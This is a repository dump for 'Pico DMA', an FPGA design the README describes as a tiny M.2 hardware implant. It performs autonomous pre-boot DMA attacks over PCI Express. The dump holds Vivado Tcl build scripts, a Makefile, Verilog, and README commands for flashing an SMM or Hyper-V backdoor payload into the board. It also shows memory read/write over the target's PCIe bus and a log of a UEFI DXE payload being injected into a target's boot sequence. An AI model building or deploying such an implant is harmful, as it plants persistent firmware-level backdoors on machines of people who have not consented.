  connect_bd_net -net clk_wiz_1_locked [get_bd_pins clk_wiz_1/locked] [get_bd_pins rst_clk_wiz_1_100M/dcm_locked]
  connect_bd_net -net mdm_1_debug_sys_rst [get_bd_pins clk_wiz_1/reset] [get_bd_pins mdm_1/Debug_SYS_Rst] [get_bd_pins rst_clk_wiz_1_100M/mb_debug_sys_rst]
  connect_bd_net -net microblaze_0_Clk [get_bd_ports clk_out] [get_bd_pins axi_bram_ctrl_0/s_axi_aclk] [get_bd_pins axi_dma_0/m_axi_mm2s_aclk] [get_bd_pins axi_dma_0/m_axi_s2mm_aclk] [get_bd_pins axi_dma_0/s_axi_lite_aclk] [get_bd_pins axi_gpio_0/s_axi_aclk] [get_bd_pins axi_quad_spi_0/ext_spi_clk] [get_bd_pins axi_quad_spi_0/s_axi_aclk] [get_bd_pins axi_uartlite_0/s_axi_aclk] [get_bd_pins clk_wiz_1/clk_out1] [get_bd_pins microblaze_0/Clk] [get_bd_pins microblaze_0_axi_intc/processor_clk] [get_bd_pins microblaze_0_axi_intc/s_axi_aclk] [get_bd_pins microblaze_0_axi_periph/ACLK] [get_bd_pins microblaze_0_axi_periph/M00_ACLK] [get_bd_pins microblaze_0_axi_periph/M01_ACLK] [get_bd_pins microblaze_0_axi_periph/M02_ACLK] [get_bd_pins microblaze_0_axi_periph/M03_ACLK] [get_bd_pins microblaze_0_axi_periph/M04_ACLK] [get_bd_pins microblaze_0_axi_periph/M05_ACLK] [get_bd_pins microblaze_0_axi_periph/M06_ACLK] [get_bd_pins microblaze_0_axi_periph/S00_ACLK] [get_bd_pins microblaze_0_axi_periph/S01_ACLK] [get_bd_pins microblaze_0_axi_periph/S02_ACLK] [get_bd_pins microblaze_0_local_memory/LMB_Clk] [get_bd_pins rst_clk_wiz_1_100M/slowest_sync_clk]
  connect_bd_net -net microblaze_0_intr [get_bd_pins microblaze_0_axi_intc/intr] [get_bd_pins microblaze_0_xlconcat/dout]
  connect_bd_net -net reset_rtl_0_1 [get_bd_ports sys_rst_n] [get_bd_pins rst_clk_wiz_1_100M/ext_reset_in]
  connect_bd_net -net rst_clk_wiz_1_100M_bus_struct_reset [get_bd_pins microblaze_0_local_memory/SYS_Rst] [get_bd_pins rst_clk_wiz_1_100M/bus_struct_reset]
  connect_bd_net -net rst_clk_wiz_1_100M_mb_reset [get_bd_pins microblaze_0/Reset] [get_bd_pins microblaze_0_axi_intc/processor_rst] [get_bd_pins rst_clk_wiz_1_100M/mb_reset]
  connect_bd_net -net rst_clk_wiz_1_100M_peripheral_aresetn [get_bd_pins axi_bram_ctrl_0/s_axi_aresetn] [get_bd_pins axi_dma_0/axi_resetn] [get_bd_pins axi_gpio_0/s_axi_aresetn] [get_bd_pins axi_quad_spi_0/s_axi_aresetn] [get_bd_pins axi_uartlite_0/s_axi_aresetn] [get_bd_pins microblaze_0_axi_intc/s_axi_aresetn] [get_bd_pins microblaze_0_axi_periph/ARESETN] [get_bd_pins microblaze_0_axi_periph/M00_ARESETN] [get_bd_pins microblaze_0_axi_periph/M01_ARESETN] [get_bd_pins microblaze_0_axi_periph/M02_ARESETN] [get_bd_pins microblaze_0_axi_periph/M03_ARESETN] [get_bd_pins microblaze_0_axi_periph/M04_ARESETN] [get_bd_pins microblaze_0_axi_periph/M05_ARESETN] [get_bd_pins microblaze_0_axi_periph/M06_ARESETN] [get_bd_pins microblaze_0_axi_periph/S00_ARESETN] [get_bd_pins microblaze_0_axi_periph/S01_ARESETN] [get_bd_pins microblaze_0_axi_periph/S02_ARESETN] [get_bd_pins rst_clk_wiz_1_100M/peripheral_aresetn]

  # Create address segments
  assign_bd_address -offset 0xC0000000 -range 0x00001000 -target_address_space [get_bd_addr_spaces axi_dma_0/Data_MM2S] [get_bd_addr_segs axi_bram_ctrl_0/S_AXI/Mem0] -force
  assign_bd_address -offset 0xC0000000 -range 0x00001000 -target_address_space [get_bd_addr_spaces axi_dma_0/Data_S2MM] [get_bd_addr_segs axi_bram_ctrl_0/S_AXI/Mem0] -force
  assign_bd_address -offset 0xC0000000 -range 0x00001000 -target_address_space [get_bd_addr_spaces microblaze_0/Data] [get_bd_addr_segs axi_bram_ctrl_0/S_AXI/Mem0] -force
  assign_bd_address -offset 0x41E00000 -range 0x00010000 -target_address_space [get_bd_addr_spaces microblaze_0/Data] [get_bd_addr_segs axi_dma_0/S_AXI_LITE/Reg] -force
  assign_bd_address -offset 0x40000000 -range 0x00010000 -target_address_space [get_bd_addr_spaces microblaze_0/Data] [get_bd_addr_segs axi_gpio_0/S_AXI/Reg] -force
  assign_bd_address -offset 0x44A00000 -range 0x00010000 -target_address_space [get_bd_addr_spaces microblaze_0/Data] [get_bd_addr_segs axi_quad_spi_0/AXI_LITE/Reg] -force
  assign_bd_address -offset 0x40600000 -range 0x00010000 -target_address_space [get_bd_addr_spaces microblaze_0/Data] [get_bd_addr_segs axi_uartlite_0/S_AXI/Reg] -force
  assign_bd_address -offset 0x00000000 -range 0x00020000 -target_address_space [get_bd_addr_spaces microblaze_0/Data] [get_bd_addr_segs microblaze_0_local_memory/dlmb_bram_if_cntlr/SLMB/Mem] -force
  assign_bd_address -offset 0x00000000 -range 0x00020000 -target_address_space [get_bd_addr_spaces microblaze_0/Instruction] [get_bd_addr_segs microblaze_0_local_memory/ilmb_bram_if_cntlr/SLMB/Mem] -force
  assign_bd_address -offset 0x41200000 -range 0x00010000 -target_address_space [get_bd_addr_spaces microblaze_0/Data] [get_bd_addr_segs microblaze_0_axi_intc/S_AXI/Reg] -force

  # Exclude Address Segments
  exclude_bd_addr_seg -offset 0x41E00000 -range 0x00010000 -target_address_space [get_bd_addr_spaces axi_dma_0/Data_MM2S] [get_bd_addr_segs axi_dma_0/S_AXI_LITE/Reg]
  exclude_bd_addr_seg -offset 0x40000000 -range 0x00010000 -target_address_space [get_bd_addr_spaces axi_dma_0/Data_MM2S] [get_bd_addr_segs axi_gpio_0/S_AXI/Reg]
  exclude_bd_addr_seg -offset 0x44A00000 -range 0x00010000 -target_address_space [get_bd_addr_spaces axi_dma_0/Data_MM2S] [get_bd_addr_segs axi_quad_spi_0/AXI_LITE/Reg]
  exclude_bd_addr_seg -offset 0x40600000 -range 0x00010000 -target_address_space [get_bd_addr_spaces axi_dma_0/Data_MM2S] [get_bd_addr_segs axi_uartlite_0/S_AXI/Reg]
  exclude_bd_addr_seg -offset 0x41200000 -range 0x00010000 -target_address_space [get_bd_addr_spaces axi_dma_0/Data_MM2S] [get_bd_addr_segs microblaze_0_axi_intc/S_AXI/Reg]
  exclude_bd_addr_seg -offset 0x41E00000 -range 0x00010000 -target_address_space [get_bd_addr_spaces axi_dma_0/Data_S2MM] [get_bd_addr_segs axi_dma_0/S_AXI_LITE/Reg]
  exclude_bd_addr_seg -offset 0x40000000 -range 0x00010000 -target_address_space [get_bd_addr_spaces axi_dma_0/Data_S2MM] [get_bd_addr_segs axi_gpio_0/S_AXI/Reg]
  exclude_bd_addr_seg -offset 0x44A00000 -range 0x00010000 -target_address_space [get_bd_addr_spaces axi_dma_0/Data_S2MM] [get_bd_addr_segs axi_quad_spi_0/AXI_LITE/Reg]
  exclude_bd_addr_seg -offset 0x40600000 -range 0x00010000 -target_address_space [get_bd_addr_spaces axi_dma_0/Data_S2MM] [get_bd_addr_segs axi_uartlite_0/S_AXI/Reg]
  exclude_bd_addr_seg -offset 0x41200000 -range 0x00010000 -target_address_space [get_bd_addr_spaces axi_dma_0/Data_S2MM] [get_bd_addr_segs microblaze_0_axi_intc/S_AXI/Reg]


  # Restore current instance
  current_bd_instance $oldCurInst

  validate_bd_design
  save_bd_design
  close_bd_design $design_name 
}
# End of cr_bd_microblaze()
cr_bd_microblaze ""
set_property REGISTERED_WITH_MANAGER "1" [get_files microblaze.bd ] 
set_property SYNTH_CHECKPOINT_MODE "Hierarchical" [get_files microblaze.bd ] 

# Create 'synth_1' run (if not found)
if {[string equal [get_runs -quiet synth_1] ""]} {
    create_run -name synth_1 -part xc7a50tcsg325-2 -flow {Vivado Synthesis 2019} -strategy "Vivado Synthesis Defaults" -report_strategy {No Reports} -constrset constrs_1
} else {
  set_property strategy "Vivado Synthesis Defaults" [get_runs synth_1]
  set_property flow "Vivado Synthesis 2019" [get_runs synth_1]
}
set obj [get_runs synth_1]
set_property set_report_strategy_name 1 $obj
set_property report_strategy {Vivado Synthesis Default Reports} $obj
set_property set_report_strategy_name 0 $obj
# Create 'synth_1_synth_report_utilization_0' report (if not found)
if { [ string equal [get_report_configs -of_objects [get_runs synth_1] synth_1_synth_report_utilization_0] "" ] } {
  create_report_config -report_name synth_1_synth_report_utilization_0 -report_type report_utilization:1.0 -steps synth_design -runs synth_1
}
set obj [get_report_configs -of_objects [get_runs synth_1] synth_1_synth_report_utilization_0]
if { $obj != "" } {

}
set obj [get_runs synth_1]
set_property -name "part" -value "xc7a50tcsg325-2" -objects $obj
set_property -name "strategy" -value "Vivado Synthesis Defaults" -objects $obj

# set the current synth run
current_run -synthesis [get_runs synth_1]

# Create 'impl_1' run (if not found)
if {[string equal [get_runs -quiet impl_1] ""]} {
    create_run -name impl_1 -part xc7a50tcsg325-2 -flow {Vivado Implementation 2019} -strategy "Vivado Implementation Defaults" -report_strategy {No Reports} -constrset constrs_1 -parent_run synth_1
} else {
  set_property strategy "Vivado Implementation Defaults" [get_runs impl_1]
  set_property flow "Vivado Implementation 2019" [get_runs impl_1]
}
set obj [get_runs impl_1]
set_property set_report_strategy_name 1 $obj
set_property report_strategy {Vivado Implementation Default Reports} $obj
set_property set_report_strategy_name 0 $obj
# Create 'impl_1_init_report_timing_summary_0' report (if not found)
if { [ string equal [get_report_configs -of_objects [get_runs impl_1] impl_1_init_report_timing_summary_0] "" ] } {
  create_report_config -report_name impl_1_init_report_timing_summary_0 -report_type report_timing_summary:1.0 -steps init_design -runs impl_1
}
set obj [get_report_configs -of_objects [get_runs impl_1] impl_1_init_report_timing_summary_0]
if { $obj != "" } {
set_property -name "is_enabled" -value "0" -objects $obj
set_property -name "options.max_paths" -value "10" -objects $obj

}
# Create 'impl_1_opt_report_drc_0' report (if not found)
if { [ string equal [get_report_configs -of_objects [get_runs impl_1] impl_1_opt_report_drc_0] "" ] } {
  create_report_config -report_name impl_1_opt_report_drc_0 -report_type report_drc:1.0 -steps opt_design -runs impl_1
}
set obj [get_report_configs -of_objects [get_runs impl_1] impl_1_opt_report_drc_0]
if { $obj != "" } {

}
# Create 'impl_1_opt_report_timing_summary_0' report (if not found)
if { [ string equal [get_report_configs -of_objects [get_runs impl_1] impl_1_opt_report_timing_summary_0] "" ] } {
  create_report_config -report_name impl_1_opt_report_timing_summary_0 -report_type report_timing_summary:1.0 -steps opt_design -runs impl_1
}
set obj [get_report_configs -of_objects [get_runs impl_1] impl_1_opt_report_timing_summary_0]
if { $obj != "" } {
set_property -name "is_enabled" -value "0" -objects $obj
set_property -name "options.max_paths" -value "10" -objects $obj

}
# Create 'impl_1_power_opt_report_timing_summary_0' report (if not found)
if { [ string equal [get_report_configs -of_objects [get_runs impl_1] impl_1_power_opt_report_timing_summary_0] "" ] } {
  create_report_config -report_name impl_1_power_opt_report_timing_summary_0 -report_type report_timing_summary:1.0 -steps power_opt_design -runs impl_1
}
set obj [get_report_configs -of_objects [get_runs impl_1] impl_1_power_opt_report_timing_summary_0]
if { $obj != "" } {
set_property -name "is_enabled" -value "0" -objects $obj
set_property -name "options.max_paths" -value "10" -objects $obj

}
# Create 'impl_1_place_report_io_0' report (if not found)
if { [ string equal [get_report_configs -of_objects [get_runs impl_1] impl_1_place_report_io_0] "" ] } {
  create_report_config -report_name impl_1_place_report_io_0 -report_type report_io:1.0 -steps place_design -runs impl_1
}
set obj [get_report_configs -of_objects [get_runs impl_1] impl_1_place_report_io_0]
if { $obj != "" } {

}
# Create 'impl_1_place_report_utilization_0' report (if not found)
if { [ string equal [get_report_configs -of_objects [get_runs impl_1] impl_1_place_report_utilization_0] "" ] } {
  create_report_config -report_name impl_1_place_report_utilization_0 -report_type report_utilization:1.0 -steps place_design -runs impl_1
}
set obj [get_report_configs -of_objects [get_runs impl_1] impl_1_place_report_utilization_0]
if { $obj != "" } {

}
# Create 'impl_1_place_report_control_sets_0' report (if not found)
if { [ string equal [get_report_configs -of_objects [get_runs impl_1] impl_1_place_report_control_sets_0] "" ] } {
  create_report_config -report_name impl_1_place_report_control_sets_0 -report_type report_control_sets:1.0 -steps place_design -runs impl_1
}
set obj [get_report_configs -of_objects [get_runs impl_1] impl_1_place_report_control_sets_0]
if { $obj != "" } {
set_property -name "options.verbose" -value "1" -objects $obj

}
# Create 'impl_1_place_report_incremental_reuse_0' report (if not found)
if { [ string equal [get_report_configs -of_objects [get_runs impl_1] impl_1_place_report_incremental_reuse_0] "" ] } {
  create_report_config -report_name impl_1_place_report_incremental_reuse_0 -report_type report_incremental_reuse:1.0 -steps place_design -runs impl_1
}
set obj [get_report_configs -of_objects [get_runs impl_1] impl_1_place_report_incremental_reuse_0]
if { $obj != "" } {
set_property -name "is_enabled" -value "0" -objects $obj

}
# Create 'impl_1_place_report_incremental_reuse_1' report (if not found)
if { [ string equal [get_report_configs -of_objects [get_runs impl_1] impl_1_place_report_incremental_reuse_1] "" ] } {
  create_report_config -report_name impl_1_place_report_incremental_reuse_1 -report_type report_incremental_reuse:1.0 -steps place_design -runs impl_1
}
set obj [get_report_configs -of_objects [get_runs impl_1] impl_1_place_report_incremental_reuse_1]
if { $obj != "" } {
set_property -name "is_enabled" -value "0" -objects $obj

}
# Create 'impl_1_place_report_timing_summary_0' report (if not found)
if { [ string equal [get_report_configs -of_objects [get_runs impl_1] impl_1_place_report_timing_summary_0] "" ] } {
  create_report_config -report_name impl_1_place_report_timing_summary_0 -report_type report_timing_summary:1.0 -steps place_design -runs impl_1
}
set obj [get_report_configs -of_objects [get_runs impl_1] impl_1_place_report_timing_summary_0]
if { $obj != "" } {
set_property -name "is_enabled" -value "0" -objects $obj
set_property -name "options.max_paths" -value "10" -objects $obj

}
# Create 'impl_1_post_place_power_opt_report_timing_summary_0' report (if not found)
if { [ string equal [get_report_configs -of_objects [get_runs impl_1] impl_1_post_place_power_opt_report_timing_summary_0] "" ] } {
  create_report_config -report_name impl_1_post_place_power_opt_report_timing_summary_0 -report_type report_timing_summary:1.0 -steps post_place_power_opt_design -runs impl_1
}
set obj [get_report_configs -of_objects [get_runs impl_1] impl_1_post_place_power_opt_report_timing_summary_0]
if { $obj != "" } {
set_property -name "is_enabled" -value "0" -objects $obj
set_property -name "options.max_paths" -value "10" -objects $obj

}
# Create 'impl_1_phys_opt_report_timing_summary_0' report (if not found)
if { [ string equal [get_report_configs -of_objects [get_runs impl_1] impl_1_phys_opt_report_timing_summary_0] "" ] } {
  create_report_config -report_name impl_1_phys_opt_report_timing_summary_0 -report_type report_timing_summary:1.0 -steps phys_opt_design -runs impl_1
}
set obj [get_report_configs -of_objects [get_runs impl_1] impl_1_phys_opt_report_timing_summary_0]
if { $obj != "" } {
set_property -name "is_enabled" -value "0" -objects $obj
set_property -name "options.max_paths" -value "10" -objects $obj

}
# Create 'impl_1_route_report_drc_0' report (if not found)
if { [ string equal [get_report_configs -of_objects [get_runs impl_1] impl_1_route_report_drc_0] "" ] } {
  create_report_config -report_name impl_1_route_report_drc_0 -report_type report_drc:1.0 -steps route_design -runs impl_1
}
set obj [get_report_configs -of_objects [get_runs impl_1] impl_1_route_report_drc_0]
if { $obj != "" } {

}
# Create 'impl_1_route_report_methodology_0' report (if not found)
if { [ string equal [get_report_configs -of_objects [get_runs impl_1] impl_1_route_report_methodology_0] "" ] } {
  create_report_config -report_name impl_1_route_report_methodology_0 -report_type report_methodology:1.0 -steps route_design -runs impl_1
}
set obj [get_report_configs -of_objects [get_runs impl_1] impl_1_route_report_methodology_0]
if { $obj != "" } {

}
# Create 'impl_1_route_report_power_0' report (if not found)
if { [ string equal [get_report_configs -of_objects [get_runs impl_1] impl_1_route_report_power_0] "" ] } {
  create_report_config -report_name impl_1_route_report_power_0 -report_type report_power:1.0 -steps route_design -runs impl_1
}
set obj [get_report_configs -of_objects [get_runs impl_1] impl_1_route_report_power_0]
if { $obj != "" } {

}
# Create 'impl_1_route_report_route_status_0' report (if not found)
if { [ string equal [get_report_configs -of_objects [get_runs impl_1] impl_1_route_report_route_status_0] "" ] } {
  create_report_config -report_name impl_1_route_report_route_status_0 -report_type report_route_status:1.0 -steps route_design -runs impl_1
}
set obj [get_report_configs -of_objects [get_runs impl_1] impl_1_route_report_route_status_0]
if { $obj != "" } {

}
# Create 'impl_1_route_report_timing_summary_0' report (if not found)
if { [ string equal [get_report_configs -of_objects [get_runs impl_1] impl_1_route_report_timing_summary_0] "" ] } {
  create_report_config -report_name impl_1_route_report_timing_summary_0 -report_type report_timing_summary:1.0 -steps route_design -runs impl_1
}
set obj [get_report_configs -of_objects [get_runs impl_1] impl_1_route_report_timing_summary_0]
if { $obj != "" } {
set_property -name "options.max_paths" -value "10" -objects $obj

}
# Create 'impl_1_route_report_incremental_reuse_0' report (if not found)
if { [ string equal [get_report_configs -of_objects [get_runs impl_1] impl_1_route_report_incremental_reuse_0] "" ] } {
  create_report_config -report_name impl_1_route_report_incremental_reuse_0 -report_type report_incremental_reuse:1.0 -steps route_design -runs impl_1
}
set obj [get_report_configs -of_objects [get_runs impl_1] impl_1_route_report_incremental_reuse_0]
if { $obj != "" } {

}
# Create 'impl_1_route_report_clock_utilization_0' report (if not found)
if { [ string equal [get_report_configs -of_objects [get_runs impl_1] impl_1_route_report_clock_utilization_0] "" ] } {
  create_report_config -report_name impl_1_route_report_clock_utilization_0 -report_type report_clock_utilization:1.0 -steps route_design -runs impl_1
}
set obj [get_report_configs -of_objects [get_runs impl_1] impl_1_route_report_clock_utilization_0]
if { $obj != "" } {

}
# Create 'impl_1_route_report_bus_skew_0' report (if not found)
if { [ string equal [get_report_configs -of_objects [get_runs impl_1] impl_1_route_report_bus_skew_0] "" ] } {
  create_report_config -report_name impl_1_route_report_bus_skew_0 -report_type report_bus_skew:1.1 -steps route_design -runs impl_1
}
set obj [get_report_configs -of_objects [get_runs impl_1] impl_1_route_report_bus_skew_0]
if { $obj != "" } {
set_property -name "options.warn_on_violation" -value "1" -objects $obj

}
# Create 'impl_1_post_route_phys_opt_report_timing_summary_0' report (if not found)
if { [ string equal [get_report_configs -of_objects [get_runs impl_1] impl_1_post_route_phys_opt_report_timing_summary_0] "" ] } {
  create_report_config -report_name impl_1_post_route_phys_opt_report_timing_summary_0 -report_type report_timing_summary:1.0 -steps post_route_phys_opt_design -runs impl_1
}
set obj [get_report_configs -of_objects [get_runs impl_1] impl_1_post_route_phys_opt_report_timing_summary_0]
if { $obj != "" } {
set_property -name "options.max_paths" -value "10" -objects $obj
set_property -name "options.warn_on_violation" -value "1" -objects $obj

}
# Create 'impl_1_post_route_phys_opt_report_bus_skew_0' report (if not found)
if { [ string equal [get_report_configs -of_objects [get_runs impl_1] impl_1_post_route_phys_opt_report_bus_skew_0] "" ] } {
  create_report_config -report_name impl_1_post_route_phys_opt_report_bus_skew_0 -report_type report_bus_skew:1.1 -steps post_route_phys_opt_design -runs impl_1
}
set obj [get_report_configs -of_objects [get_runs impl_1] impl_1_post_route_phys_opt_report_bus_skew_0]
if { $obj != "" } {
set_property -name "options.warn_on_violation" -value "1" -objects $obj

}
set obj [get_runs impl_1]
set_property -name "part" -value "xc7a50tcsg325-2" -objects $obj
set_property -name "strategy" -value "Vivado Implementation Defaults" -objects $obj
set_property -name "steps.phys_opt_design.is_enabled" -value "1" -objects $obj
set_property -name "steps.write_bitstream.args.bin_file" -value "1" -objects $obj
set_property -name "steps.write_bitstream.args.readback_file" -value "0" -objects $obj
set_property -name "steps.write_bitstream.args.verbose" -value "0" -objects $obj

# set the current impl run
current_run -implementation [get_runs impl_1]

puts "INFO: Project created:${_xil_proj_name_}"
# Create 'drc_1' gadget (if not found)
if {[string equal [get_dashboard_gadgets  [ list "drc_1" ] ] ""]} {
create_dashboard_gadget -name {drc_1} -type drc
}
set obj [get_dashboard_gadgets [ list "drc_1" ] ]
set_property -name "reports" -value "impl_1#impl_1_route_report_drc_0" -objects $obj

# Create 'methodology_1' gadget (if not found)
if {[string equal [get_dashboard_gadgets  [ list "methodology_1" ] ] ""]} {
create_dashboard_gadget -name {methodology_1} -type methodology
}
set obj [get_dashboard_gadgets [ list "methodology_1" ] ]
set_property -name "reports" -value "impl_1#impl_1_route_report_methodology_0" -objects $obj

# Create 'power_1' gadget (if not found)
if {[string equal [get_dashboard_gadgets  [ list "power_1" ] ] ""]} {
create_dashboard_gadget -name {power_1} -type power
}
set obj [get_dashboard_gadgets [ list "power_1" ] ]
set_property -name "reports" -value "impl_1#impl_1_route_report_power_0" -objects $obj

# Create 'timing_1' gadget (if not found)
if {[string equal [get_dashboard_gadgets  [ list "timing_1" ] ] ""]} {
create_dashboard_gadget -name {timing_1} -type timing
}
set obj [get_dashboard_gadgets [ list "timing_1" ] ]
set_property -name "reports" -value "impl_1#impl_1_route_report_timing_summary_0" -objects $obj

# Create 'utilization_1' gadget (if not found)
if {[string equal [get_dashboard_gadgets  [ list "utilization_1" ] ] ""]} {
create_dashboard_gadget -name {utilization_1} -type utilization
}
set obj [get_dashboard_gadgets [ list "utilization_1" ] ]
set_property -name "reports" -value "synth_1#synth_1_synth_report_utilization_0" -objects $obj
set_property -name "run.step" -value "synth_design" -objects $obj
set_property -name "run.type" -value "synthesis" -objects $obj

# Create 'utilization_2' gadget (if not found)
if {[string equal [get_dashboard_gadgets  [ list "utilization_2" ] ] ""]} {
create_dashboard_gadget -name {utilization_2} -type utilization
}
set obj [get_dashboard_gadgets [ list "utilization_2" ] ]
set_property -name "reports" -value "impl_1#impl_1_place_report_utilization_0" -objects $obj

move_dashboard_gadget -name {utilization_1} -row 0 -col 0
move_dashboard_gadget -name {power_1} -row 1 -col 0
move_dashboard_gadget -name {drc_1} -row 2 -col 0
move_dashboard_gadget -name {timing_1} -row 0 -col 1
move_dashboard_gadget -name {utilization_2} -row 1 -col 1
move_dashboard_gadget -name {methodology_1} -row 2 -col 1

```

`Makefile`:

```
project:
	vivado -mode batch -source 7x_pcie_microblaze.tcl

bin:
	cp 7x_pcie_microblaze/7x_pcie_microblaze.runs/impl_1/pcie_microblaze_top.bin 7x_pcie_microblaze.bin
	cp 7x_pcie_microblaze/7x_pcie_microblaze.runs/impl_1/pcie_microblaze_top.bit 7x_pcie_microblaze.bit


```

`README.md`:

```md

# Pico DMA

[General information](#general-information)  
[Configuration and usage](#configuration-and-usage)  
[Autonomous DMA attacks](#autonomous-dma-attacks)  

## General information

This design allows to perform fully autonomous pre-boot DMA attacks over PCI Express bus using [Microblaze soft-processor](https://github.com/Cr4sh/pico_dma/blob/main/microblaze_soc.pdf) with embedded [software stack](https://github.com/Cr4sh/pico_dma/tree/main/software/application/src) running on [PicoEVB development board](https://www.crowdsupply.com/rhs-research/picoevb) with Xilinx Artix 7 FPGA. Using Pico DMA design it's possible to create hardware implants in format of tiny M.2 2230 card that injects my [Hyper-V backdoor](https://github.com/Cr4sh/s6_pcie_microblaze/tree/master/python/payloads/DmaBackdoorHv), [SMM Backdoor Next Gen](https://github.com/Cr4sh/SmmBackdoorNg) or any other UEFI DXE driver as payload into the target machine boot sequence.

Despite being focused on autonomous operation Pico DMA alternatively can be controlled over the UART interface in fully compatible way with [PCI Express DIY hacking toolkit](https://github.com/Cr4sh/s6_pcie_microblaze) software libraries and programs. The toolkit is also [providing](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/evb_ctl.py) `evb_ctl.py` program used by this design to flash PicoEVB bitstream and payload UEFI DXE driver into the on-board SPI flash chip.

<img src="https://raw.githubusercontent.com/Cr4sh/pico_dma/master/docs/images/boards.jpg" width="700">


## Configuration and usage

To configure and control the implant Pico DMA is using GPIO ports of `P1` connector of PicoEVB to expose UART interface (baud-rate 115200) and two push buttons: one for CPU reset and second for switching between autonomous mode and UART-controlled mode.

<img src="https://raw.githubusercontent.com/Cr4sh/pico_dma/master/docs/images/pico_evb_pinout.png" width="598">

To work with this interface it's convenient to make a cable like this one, where one end is connected to `P1` of the board and another is UART interface connected with any suitable USB adapter to Linux machine with PCI Express DIY hacking toolkit programs installed.

<img src="https://raw.githubusercontent.com/Cr4sh/pico_dma/master/docs/images/pico_evb_cable.png" width="580">

By default Pico DMA starts its operation in autonomous mode. To switch from autonomous mode to UART-controlled mode you need to press CPU reset `SW2` push button while holding `SW1` mode select button, and release mode select after user LED `A` of the board lights up. To switch back to the autonomous mode you can either push CPU reset button or just reboot the target to which the board is connected over M.2 port.

In UART-controlled mode you can use `evb_ctl.py` program to load desired payload UEFI DXE driver image into the SPI flash chip of the board with the following command:

```
# python2 evb_ctl.py --rom-load ~/SmmBackdoorNg_X64.efi
[+] Opening device...
[+] Erasing ROM...
[+] Maximum ROM size for this device is 2818048 bytes
[+] Loading 19712 bytes of ROM...
[+] 100% completed
[+] Done
```

To erase payload image from memory you can use appropriate `--rom-erase` option of the program. 

Also, you can use the same program to flash FPGA bitstream into the board:

```
# python2 evb_ctl.py --bit-load 7x_pcie_microblaze.bin
[+] Opening device...
[+] Erasing memory...
[+] Loading 1358540 bytes of bitstream...
[+] 100% completed
[+] Done
```

When PCI-E link with the board is up &minus; UART-controlled mode allows you to work with usual Python tools from PCI Express DIY hacking toolkit. For example, you can read PCI configuration space registers of the board using `pcie_cfg.py` program:

```
# python2 pcie_cfg.py
[+] PCI-E link with target is up
[+] Device address is 01:00.0

           VENDOR_ID = 0x10ee
           DEVICE_ID = 0x1337
             COMMAND = 0x0
              STATUS = 0x2010
            REVISION = 0x0
          CLASS_PROG = 0x0
        CLASS_DEVICE = 0x200
     CACHE_LINE_SIZE = 0x0
       LATENCY_TIMER = 0x0
         HEADER_TYPE = 0x0
                BIST = 0x0
      BASE_ADDRESS_0 = 0x91500000
      BASE_ADDRESS_1 = 0x0
      BASE_ADDRESS_2 = 0x0
      BASE_ADDRESS_3 = 0x0
      BASE_ADDRESS_4 = 0x0
      BASE_ADDRESS_5 = 0x0
         CARDBUS_CIS = 0x0
 SUBSYSTEM_VENDOR_ID = 0x10ee
        SUBSYSTEM_ID = 0x7
         ROM_ADDRESS = 0x0
      INTERRUPT_LINE = 0xff
       INTERRUPT_PIN = 0x1
             MIN_GNT = 0x0
             MAX_LAT = 0x0
```

Or even perform memory read or write operations over PCI-E bus of the target at relatively low speed of UART interface with `pcie_mem.py` program:

```
$ DEBUG_TLP=1 python2 pcie_mem.py 0x10000 0x20
[+] PCI-E link with target is up
[+] Device address is 01:00.0
TLP TX: size = 0x04, source = 01:00.0, type = MRd64
        tag = 0x13, bytes = 0x20, addr = 0x00010000

        0x20000008 0x010013ff 0x00000000 0x00010000

TLP RX: size = 0x0b, source = 00:00.0, type = CplD
        tag = 0x13, bytes = 32, req = 01:00.0, comp = 00:00.0

        0x4a000008 0x00000020 0x01001300
        0xc4230c00 0x00000000 0xd43039ce 0xd5202acf 0x48c7c000 0x0001000f 0xae38488b 0x004885c0

00010000: c4 23 0c 00 00 00 00 00 d4 30 39 ce d5 20 2a cf | .........09.....
00010010: 48 c7 c0 00 00 01 00 0f ae 38 48 8b 00 48 85 c0 | H........8H..H..
```


## Autonomous DMA attacks

While working in autonomous mode, which is activated by default when board powers on, Pico DMA is trying to start DMA attack as soon as PCI-E bus becomes usable, injects previously flashed payload UEFI DXE driver into the target machine boot sequence and prints appropriate debug messages into the UART port:

```
mode_standalone(): Starting attack...
Image size is 0x4D00
Section #0 addr = 0x2E0, size = 0x3817
Section #1 addr = 0x3B00, size = 0xAB8
Section #2 addr = 0x45C0, size = 0x380
Section #3 addr = 0x4940, size = 0x28
Section #4 addr = 0x4980, size = 0x15C
Section #5 addr = 0x4AE0, size = 0x1E4
Section #6 addr = 0x4CE0, size = 0xC
Payload size is 19712 bytes
Payload config RVA is 0x4940
SCAN_CONF is not present
Waiting for PCI-E endpoint to be ready...
dev_id = 1:0.0
Starting memory scan...
scan_memory(): start = 0xE0000000
scan_memory():   end = 0x70000000
scan_memory():  step = 0x10000
EFI image is at 0x7A070000
EFI_SYSTEM_TABLE is at 0x7A03E018
EFI_BOOT_SERVICES is at 0x7A38FA30
LocateProtocol() is at 0x7A3987B4
Payload stub is at 0x10010
Payload is at 0xC0000
Payload entry is at 0xC23C4
mode_standalone(): Completed
```

Project documentation is still incomplete at this moment.


## About

Developed by:<br />
Dmytro Oleksiuk (aka Cr4sh)

[cr4sh0@gmail.com](mailto:cr4sh0@gmail.com)<br />
[http://blog.cr4.sh](http://blog.cr4.sh)

```

`hdl/7x_pcie_microblaze.v`:

```v
//
// Top level module
//

`timescale 1 ps / 1 ps

`define PCI_EXP_EP_OUI 24'h000A35

//
// Device Serial Number (DSN) constants
//
`define PCI_EXP_EP_DSN_2 32'h00000001
`define PCI_EXP_EP_DSN_1 {{ 8'h1 }, `PCI_EXP_EP_OUI }

module pcie_microblaze_top #
(
  parameter PL_FAST_TRAIN = "FALSE",        // Simulation Speedup
  parameter EXT_PIPE_SIM = "FALSE",         // This Parameter has effect on selecting Enable External PIPE Interface in GUI.	
  parameter PCIE_EXT_CLK = "TRUE",          // Use External Clocking Module
  parameter REF_CLK_FREQ = 0,               // 0 - 100 MHz, 1 - 125 MHz, 2 - 250 MHz
  parameter C_DATA_WIDTH = 64,              // RX/TX interface data width
  parameter KEEP_WIDTH = C_DATA_WIDTH / 8   // TSTRB width
)(
  input sys_clk_n,
  input sys_clk_p,
  input sys_rst_n,
  input [1:0] user_io,
  output [2:0] user_led,
  input uart_rxd,
  output uart_txd,
  output clkreq_l,
  output pcie_txp,
  output pcie_txn,
  input pcie_rxp,
  input pcie_rxn,
  inout spi_io0_io,
